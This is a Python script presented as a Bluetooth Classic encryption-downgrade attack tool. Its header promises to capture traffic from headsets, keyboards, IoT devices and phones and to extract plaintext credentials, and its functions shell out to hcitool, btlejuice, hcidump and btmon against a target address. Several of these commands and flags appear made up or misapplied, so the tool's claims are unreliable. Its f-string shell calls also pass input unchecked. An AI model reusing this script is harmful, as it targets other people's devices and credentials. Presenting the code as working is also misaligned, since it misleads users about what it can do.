import argparse
import os
import time

# -------------------------------------------
# Bluetooth Classic Downgrade Attack Tool
# -------------------------------------------
# Features:
# - Forces Bluetooth encryption downgrade to weak or no encryption
# - Captures downgraded traffic and extracts plaintext credentials
# - Bypasses modern Bluetooth security measures (e.g., SSP, LE Secure Connections)
# - Works on Bluetooth headsets, keyboards, IoT devices, and mobile phones
#
# Requirements:
# - Python 3.x
# - Ubertooth One, UD100 Bluetooth Adapter, LimeSDR Mini, ESP8266
# - Wireshark, hcitool, hcidump, btmon, BtleJuice
#
# Usage:
# 1. Scan for Bluetooth Classic devices:
#    python bt_downgrade_attack.py --scan
# 2. Force encryption downgrade on a target:
#    python bt_downgrade_attack.py --downgrade --target XX:XX:XX:XX:XX:XX
# 3. Capture downgraded traffic:
#    python bt_downgrade_attack.py --sniff --target XX:XX:XX:XX:XX:XX --output bt_downgrade.pcap
# 4. Extract plaintext credentials from captured packets:
#    python bt_downgrade_attack.py --extract-credentials --input bt_downgrade.pcap
# -------------------------------------------

def scan_bluetooth_devices():
    """Scans for nearby Bluetooth Classic devices."""
    print("[+] Scanning for Bluetooth Classic devices...")
    os.system("hcitool scan")
    print("[✔] Scan complete.")

def downgrade_bluetooth_security(target):
    """Forces encryption downgrade on a target Bluetooth device."""
    print(f"[+] Forcing encryption downgrade on {target}...")
    os.system(f"btlejuice --mitm --target {target} --downgrade")
    print("[✔] Downgrade attack initiated.")

def sniff_downgraded_traffic(target, output_file):
    """Sniffs downgraded traffic from a target Bluetooth device."""
    print(f"[+] Capturing downgraded traffic from {target}...")
    os.system(f"hcidump -X -i hci0 > {output_file}")
    print(f"[✔] Capture saved to {output_file}.")

def extract_plaintext_credentials(input_file):
    """Extracts plaintext credentials from a captured HCI packet log."""
    print(f"[+] Extracting plaintext credentials from {input_file}...")
    os.system(f"btmon --read {input_file} --keys-only")
    print("[✔] Credential extraction complete.")

def main():
    parser = argparse.ArgumentParser(description="Bluetooth Classic Downgrade Attack Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for Bluetooth Classic devices")
    parser.add_argument("--downgrade", action='store_true', help="Force encryption downgrade on a target device")
    parser.add_argument("--target", type=str, help="Target Bluetooth MAC address")
    parser.add_argument("--sniff", action='store_true', help="Sniff downgraded traffic from a target device")
    parser.add_argument("--output", type=str, help="Output file for captured packets")
    parser.add_argument("--extract-credentials", action='store_true', help="Extract plaintext credentials from a capture file")
    parser.add_argument("--input", type=str, help="Input PCAP file for credential extraction")
    args = parser.parse_args()
    
    if args.scan:
        scan_bluetooth_devices()
    elif args.downgrade and args.target:
        downgrade_bluetooth_security(args.target)
    elif args.sniff and args.target and args.output:
        sniff_downgraded_traffic(args.target, args.output)
    elif args.extract_credentials and args.input:
        extract_plaintext_credentials(args.input)
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
